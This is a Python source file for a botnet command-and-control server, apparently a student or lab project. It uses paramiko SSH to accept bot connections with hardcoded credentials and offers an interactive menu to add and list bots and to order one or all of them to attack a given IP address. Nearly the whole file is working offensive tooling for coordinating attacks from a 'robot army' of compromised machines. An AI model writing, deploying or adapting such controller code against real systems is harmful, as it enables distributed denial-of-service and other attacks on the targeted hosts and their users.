import paramiko
import os
import socket

## Server and communications are inspired by demos found
## https://github.com/paramiko/paramiko/blob/main/demos/

## this is from stack overflow, just use to print ip address for giving to bots
def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(0)
    try:
        # doesn't even have to be reachable
        s.connect(('10.254.254.254', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

## server class used for communicating with bots, replaces the defaults in server.py
## if we dont change this then the default is fail and you can never log in
class SSH_Server(paramiko.ServerInterface):
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVLY_PROHIBITED

    def check_auth_password(self, username: str, password: str) -> int:
        if (username == 'robot_army') and (password == 'i_am_a_robot'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

## lists out the possible commands if help is entered
def print_options():
     print("Options:\n add_bot\n list_bots\n attack <ip address>\n attack_single <ip address>\n stop\n exit")

## function to handle individual communications and make code cleaner
## channel is the communication channel and command is the string being sent to the bot
def communicate(channel, command):
    channel.send(command)
    ret_value = channel.recv(8192)
    print(ret_value.decode())

## Allows individual control of bot if desired
## takes an established connection
def comm_handler(channel):
    try:
        connection_open = True

        # list of commands we can send to the bots
        while connection_open:
            command_line = ('zombie_bot> ')
            command = input(command_line + '')
                 
            # send all easy commands (help, attack, stop)
            if command.split(" ")[0] in bot_command_list:
                communicate(channel, command)
                continue

            # tell the bot to exit
            if command.split(" ")[0] == 'exit':
                communicate(channel, command)
                connection_open = False
                continue
            
            # return the channel to be placed in the bot_list
            if command.split(" ")[0] == 'wait':
                return channel

            # tell the user what commands are available
            else:
                try:
                    print('Availible commands are: exit, attack <ip address>, stop, or wait.')
                    continue
                except SystemError:
                    pass

    except Exception as e:
        print(str(e))
        pass
    except KeyboardInterrupt:
        print("exiting")
        quit()

## sets up the channel to the bot,
def add_bot(port):
    server = '0.0.0.0'
    CWD = os.getcwd()
    HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'id_rsa'))

    # set up the socket for the bot to connect to then wait
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server, port))
        sock.listen()
        print("listening")
        client, addr = sock.accept()

    except KeyboardInterrupt:
        quit()

    # establish the ssh connections to the bot 
    SSH_Session = paramiko.Transport(client)
    SSH_Session.add_server_key(HOSTKEY)
    server = SSH_Server()
    SSH_Session.start_server(server=server)
    channel = SSH_Session.accept()

    #ensure connection was correctly established
    if channel is None:
        print("Channel Error")
        quit()
    
    # establish communications with the bot then return the channel for storage in the bot list once
    # individual communications are finished
    print("Channel successful")
    checkin_message = channel.recv(1024).decode()
    print(f'{checkin_message}')
    channel.send("hello")
    comm_handler(channel)
    return channel
        

## all major functions of the server done, the port is the current port to be used if a new bot is added
## the next attacker tells us who the next bot to attack will be given that there are some number of bots
## total attackers keeps track of how many bots we have attacking so we do not send out attack commands twice
def server_interface(port, next_attacker, total_attackers):
    command = input("What action would you like to perform? " + '')

    try:
        # give useage information
        if command.split(' ')[0] == "help":
            print_options()
            server_interface(port, next_attacker, total_attackers)


        # add a bot to our bot army
        if command.split(' ')[0] == "add_bot":
            print(get_ip())
            print(port)
            bot = add_bot(port)
            bot_list.append(bot)
            port = port + 1
            server_interface(port, next_attacker, total_attackers)


        # provide a list of current bots
        if command.split(' ')[0] == "list_bots":
            num = 1
            for bot in bot_list:
                print(num)
                num += 1
            server_interface(port, next_attacker, total_attackers)


        # tell a single bot to attack the target
        if command.split(' ')[0] == "attack_single":

            # if all bots are attacking dont want to send attack again
            if total_attackers <= len(bot_list) - 1:
                channel = bot_list[next_attacker]
                command = f"attack {command.split(' ')[1]}"
                communicate(channel, command)
                
                if next_attacker < len(bot_list) - 1:
                    next_attacker += 1
                    total_attackers +=1
                else:
                    next_attacker = 0
                    total_attackers +=1
            else:
                print("All bots are attacking.")

            server_interface(port, next_attacker, total_attackers)


        # tell each bot to attack the target, or stop attacking
        if command.split(' ')[0] == "attack" or command.split(' ')[0] == "stop":
            if command.split(' ')[0] == "stop":
                total_attackers = 0
            else:
                total_attackers = len(bot_list) - 1
            
            for bot in bot_list:
                communicate(bot, command)
            server_interface(port, next_attacker, total_attackers)

        # exit from each bot then exit the program
        if command.split(' ')[0] == "exit":
            for bot in bot_list:
                communicate(bot, command)
            print("exiting")
            quit()

        # handle any input that we didnt prepare for
        else:
            server_interface(port, next_attacker, total_attackers)

    # handle any exceptions 
    except Exception as e:
        print(str(e))
        pass
    except KeyboardInterrupt:
        print("exiting")
        quit()
        
## set up any parameters that we rely on during operations and call the server interface
if __name__ == '__main__':
    try:
        bot_list = []
        port = 2222
        bot_command_list = ["attack", "stop", "help"]

        print("Welcome.")
        server_interface(port, 0, 0)
    except Exception as e:
        print(str(e))
        pass
    except KeyboardInterrupt:
        print("exiting")
        quit()
    